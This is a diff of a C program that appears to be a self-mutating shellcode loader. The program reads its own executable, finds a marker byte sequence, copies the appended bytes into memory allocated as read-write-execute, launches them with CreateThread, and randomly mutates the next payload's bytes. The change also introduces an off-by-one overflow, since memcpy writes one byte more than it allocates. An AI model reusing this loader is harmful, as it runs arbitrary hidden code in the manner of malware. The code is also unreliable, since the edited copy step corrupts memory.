@@ -41,14 +41,14 @@ int main(int argc, char** argv)
     myFileBuffer = (UINT8 *)malloc(myEXESize);
     fread(myFileBuffer, 1, myEXESize, fp);
     fclose(fp);
-    for (int i = 0; i < myEXESize - 2; i++)
-        if (myFileBuffer[i] == 0x90 && myFileBuffer[i + 1] == 0x90 && myFileBuffer[i + 2] == 0x90)
+    for (int i = 0; i < myEXESize - 3; i++)
+        if (myFileBuffer[i] == 0x23 && myFileBuffer[i + 1] == 0x90 && myFileBuffer[i + 2] == 0x90 && myFileBuffer[i + 3] == 0x90)
         {
             //printf("Found Payload Start @ 0x%X\n", i);
             myStaticLength = i;
             myPayloadLength = myEXESize - myStaticLength;
-            executeableMem = (UINT8*)VirtualAlloc(0, myPayloadLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            memcpy(executeableMem, myFileBuffer + myStaticLength, myPayloadLength);
+            executeableMem = (UINT8*)VirtualAlloc(0, myPayloadLength - 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            memcpy(executeableMem, myFileBuffer + myStaticLength + 1, myPayloadLength);
             CreateThread(0, 0, (LPTHREAD_START_ROUTINE)executeableMem, 0, 0, 0);
             break;
         }
@@ -56,7 +56,8 @@ int main(int argc, char** argv)
     {
         myStaticLength = myEXESize;
         nextPayloadBuf = (UINT8*)malloc(NextPayloadSize);
-        for (int i = 0; i < NextPayloadSize - 1; i++)
+        nextPayloadBuf[0] = 0x23;
+        for (int i = 1; i < NextPayloadSize - 1; i++)
         {
             nextPayloadBuf[i] = 0x90;
         }
@@ -82,7 +83,7 @@ int main(int argc, char** argv)
 
 void MuNxtPayload()
 {
-    int pos = rand() % (NextPayloadSize - 4) + 3;
+    int pos = rand() % (NextPayloadSize - 5) + 4;
     nextPayloadBuf[pos] = rand() % 256;
 }
 
